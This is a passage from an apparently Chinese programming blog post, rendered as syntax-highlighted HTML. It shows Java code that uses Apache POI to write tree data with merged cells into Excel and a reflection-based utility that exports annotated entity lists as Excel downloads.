punctuation">(</span>child1<span class="token punctuation">)</span><span class="token punctuation">;</span>        rootNode<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>child2<span class="token punctuation">)</span><span class="token punctuation">;</span>        child1<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>subChild1<span class="token punctuation">)</span><span class="token punctuation">;</span>        child2<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>subChild2<span class="token punctuation">)</span><span class="token punctuation">;</span>        child2<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>subChild3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> rootNode<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">fillTreeData</span><span class="token punctuation">(</span>Sheet sheet<span class="token punctuation">,</span> TreeNode node<span class="token punctuation">,</span> <span class="token keyword">int</span> rowStart<span class="token punctuation">,</span> <span class="token keyword">int</span> colStart<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取开始行，如果不存在则创建一行</span>        Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">getRow</span><span class="token punctuation">(</span>rowStart<span class="token punctuation">)</span> <span class="token operator">==</span> null <span class="token operator">?</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>rowStart<span class="token punctuation">)</span> <span class="token operator">:</span> sheet<span class="token punctuation">.</span><span class="token function">getRow</span><span class="token punctuation">(</span>rowStart<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 在开始列创建一个单元格</span>        Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>colStart<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置单元格的值为节点名称</span>        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 检查节点是否有子节点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>children<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果没有子节点，那么这个节点只占用一行</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果有子节点，则需要计算所有子节点占用的行数</span>            <span class="token keyword">int</span> totalRows <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> childrenColStart <span class="token operator">=</span> colStart <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对每个子节点进行递归调用</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>TreeNode child <span class="token operator">:</span> node<span class="token punctuation">.</span>children<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> childRows <span class="token operator">=</span> <span class="token function">fillTreeData</span><span class="token punctuation">(</span>sheet<span class="token punctuation">,</span> child<span class="token punctuation">,</span> rowStart <span class="token operator">+</span> totalRows<span class="token punctuation">,</span> childrenColStart<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 将子节点占用的行数累加到总行数中</span>                totalRows <span class="token operator">+=</span> childRows<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 如果子节点占用的行数大于1，则需要合并单元格</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>totalRows <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 合并单元格</span>                sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span>rowStart<span class="token punctuation">,</span> rowStart <span class="token operator">+</span> totalRows <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> colStart<span class="token punctuation">,</span> colStart<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置单元格垂直居中对齐</span>                CellUtil<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置单元格水平居中对齐</span>                CellUtil<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 返回占用的总行数</span>            <span class="token keyword">return</span> totalRows<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="利用反射实现Excel导出"><a href="#利用反射实现Excel导出" class="headerlink" title="利用反射实现Excel导出"></a>利用反射实现Excel导出</h2><p>需要导出多个Excel，且Excel样式相同</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> cn<span class="token punctuation">.</span>afterturn<span class="token punctuation">.</span>easypoi<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Excel<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psc<span class="token punctuation">.</span>csstp<span class="token punctuation">.</span>system<span class="token punctuation">.</span>api<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>tqzz<span class="token punctuation">.</span>AcceptPracticeEntSon<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>SneakyThrows<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>util<span class="token punctuation">.</span>CellRangeAddress<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFWorkbook<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author chenZM * @Date 2024年01月31日 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyExcelUtil</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 创建单元格并设置值     *     * @param row 行对象     * @param column 列索引     * @param value 值     * @param workbook 工作簿对象     * @param isHeader 是否为表头     * @param sheet 工作表对象     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">createCellAndSetValue</span><span class="token punctuation">(</span>Row row<span class="token punctuation">,</span> <span class="token keyword">int</span> column<span class="token punctuation">,</span> String value<span class="token punctuation">,</span> Workbook workbook<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isHeader<span class="token punctuation">,</span> Sheet sheet<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>column<span class="token punctuation">)</span><span class="token punctuation">;</span>        CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>isHeader<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Font font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置字体大小为14</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeightInPoints</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置行高为30</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            row<span class="token punctuation">.</span><span class="token function">setHeightInPoints</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置行高为20</span>            style<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置上边框线为细线</span>            style<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置下边框线为细线</span>            style<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置左边框线为细线</span>            style<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置右边框线为细线</span>        <span class="token punctuation">}</span>        sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置单元格宽度为15个字符宽度</span>        cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 获取类的字段     * @param clazz:     * @return: List&lt;String>     * @Author: CZM     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">getFields</span><span class="token punctuation">(</span>Class <span class="token class-name">clazz</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> list<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>clazz<span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> list<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//判断属性是否标注了@Excel注解</span>            <span class="token keyword">boolean</span> fieldHasAnno <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fieldHasAnno<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获取@Excel注解</span>                Excel excel <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span> excel<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> list<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 获取List的元素类型     * @param list:     * @return: Class&lt;?>     * @Author: CZM     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">getListElementType</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>list <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object firstElement <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> firstElement<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *     * @param sheetName:     * @param title: 表头标题     * @param list:     * @param response:     * @return: void     * @Author: CZM     */</span>    <span class="token annotation punctuation">@SneakyThrows</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exportExcel</span><span class="token punctuation">(</span>String sheetName<span class="token punctuation">,</span> String title<span class="token punctuation">,</span> List<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> list<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> listElementType <span class="token operator">=</span> <span class="token function">getListElementType</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> fields <span class="token operator">=</span> <span class="token function">getFields</span><span class="token punctuation">(</span>listElementType<span class="token punctuation">)</span><span class="token punctuation">;</span>        fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"序号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//listElementType如果是AcceptPracticeEntSon类就删除最后两个字段</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>listElementType<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>AcceptPracticeEntSon<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                fields<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                fields<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        Workbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Sheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>sheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 合并单元格</span>        sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建行</span>        Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">createCellAndSetValue</span><span class="token punctuation">(</span>row1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> title<span class="token punctuation">,</span> workbook<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span>sheet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//写入第二行表头数据</span>        Row row2 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">createCellAndSetValue</span><span class="token punctuation">(</span>row2<span class="token punctuation">,</span> i<span class="token punctuation">,</span> fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> workbook<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> sheet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 填充数据</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object data <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 创建新行，行索引从2开始（因为已经有两行表头）</span>            <span class="token function">createCellAndSetValue</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> workbook<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> sheet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 序号</span>            <span class="token comment" spellcheck="true">// 获取实体类的所有字段</span>            Field<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> listElementType<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 遍历每个字段，跳过 "序号"</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String excelName <span class="token operator">=</span> fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 查找匹配的字段</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Excel excel <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>excel <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> excel<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>excelName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// 使用反射来调用 getter 方法获取字段的值</span>                        String fieldName <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        String methodName <span class="token operator">=</span> <span class="token string">"get"</span> <span class="token operator">+</span> fieldName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> fieldName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        Method method <span class="token operator">=</span> listElementType<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        Object value <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 将字段的值写入到 Excel 文件中</span>                        <span class="token function">createCellAndSetValue</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> j<span class="token punctuation">,</span> value <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> workbook<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> sheet<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>FileOutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Administrator\\Desktop\\fileName2.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String uuid <span class="token operator">=</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 设置输出流信息</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/octet-stream;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename=file.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Pargam"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建输出流</span>        OutputStream outputStream <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将Workbook写入输出流</span>        workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 关闭Workbook和输出流</span>        workbook<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token 